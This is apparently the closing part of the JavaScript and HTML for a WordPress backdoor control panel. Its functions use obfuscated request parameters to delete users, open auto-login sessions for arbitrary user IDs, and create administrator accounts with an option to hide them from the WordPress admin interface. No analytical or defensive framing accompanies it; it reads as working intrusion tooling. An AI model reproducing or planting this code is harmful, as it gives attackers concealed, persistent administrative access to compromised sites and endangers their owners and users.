function confirmDelete() {
  if (!userToDelete) return;
  
  const button = document.querySelector(`button[onclick="deleteUser(${userToDelete},"]`);
  if (button) {
    button.classList.add('loading');
    button.innerHTML = '<span class="spinner"></span> Deleting...';
  }
  
  makeRequest({c4t: 'del', uix: userToDelete}, function(response) {
    try {
      const result = JSON.parse(response);
      
      closeModal('deleteModal');
      
      if (result.ok) {
        const statusEl = document.getElementById('create-status');
        statusEl.textContent = `User ${result.user} has been deleted successfully`;
        statusEl.className = 'status-message status-success';
        
        loadUsers();
        
        setTimeout(() => {
          statusEl.className = 'status-message';
        }, 5000);
      } else {
        let errorMsg = 'Error deleting user';
        if (result.err === 'cannot_delete_self') {
          errorMsg = 'You cannot delete your own account';
        }
        alert(errorMsg);
      }
    } catch (e) {
      alert('Error deleting user');
    }
    
    userToDelete = null;
  });
}

function autoLogin(userId) {
  makeRequest({c4t: 'alog', uix: userId}, function(response) {
    try {
      const result = JSON.parse(response);
      window.open(result.url, '_blank');
    } catch (e) {
      alert('Error with auto login');
    }
  });
}

function createAdmin() {
  const username = document.getElementById('username').value.trim();
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();
  const hideUser = document.getElementById('hide-user').checked;
  const statusEl = document.getElementById('create-status');
  
  statusEl.className = 'status-message';
  
  if (!username || !password) {
    statusEl.textContent = 'Username and password are required';
    statusEl.className = 'status-message status-error';
    return;
  }
  
  statusEl.textContent = 'Creating admin user...';
  statusEl.className = 'status-message status-success';
  
  const data = {
    c4t: 'cadm',
    xun: username,
    xem: email,
    xpw: password
  };
  
  if (hideUser) {
    data.hide_user = '1';
  }
  
  makeRequest(data, function(response) {
    try {
      const result = JSON.parse(response);
      
      if (result.ok) {
        let message = `Admin user created: ${result.u} / ${result.p}`;
        if (result.hide) {
          message += ' (User hidden from WordPress admin)';
        }
        statusEl.textContent = message;
        statusEl.className = 'status-message status-success';
        
        document.getElementById('username').value = '';
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
        document.getElementById('hide-user').checked = false;
        
        loadUsers();
      } else {
        statusEl.textContent = `Error: ${result.err || 'Unknown error'}`;
        statusEl.className = 'status-message status-error';
      }
    } catch (e) {
      statusEl.textContent = 'Error creating admin user';
      statusEl.className = 'status-message status-error';
    }
  });
}

function copyToClipboard(elementId) {
  const element = document.getElementById(elementId);
  const text = element.textContent;
  
  navigator.clipboard.writeText(text).then(function() {
    const originalText = element.textContent;
    element.textContent = 'Copied!';
    element.style.color = 'var(--success)';
    
    setTimeout(() => {
      element.textContent = originalText;
      element.style.color = '';
    }, 1500);
  });
}

function closeModal(modalId) {
  document.getElementById(modalId).style.display = 'none';
  userToDelete = null;
}

window.onload = function() {
  loadUsers();
  
  const inputs = document.querySelectorAll('#username, #email, #password');
  inputs.forEach(input => {
    input.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        createAdmin();
      }
    });
  });
  
  window.addEventListener('click', function(e) {
    const modal = document.getElementById('deleteModal');
    if (e.target === modal) {
      closeModal('deleteModal');
    }
  });
};
</script>
</body>
</html>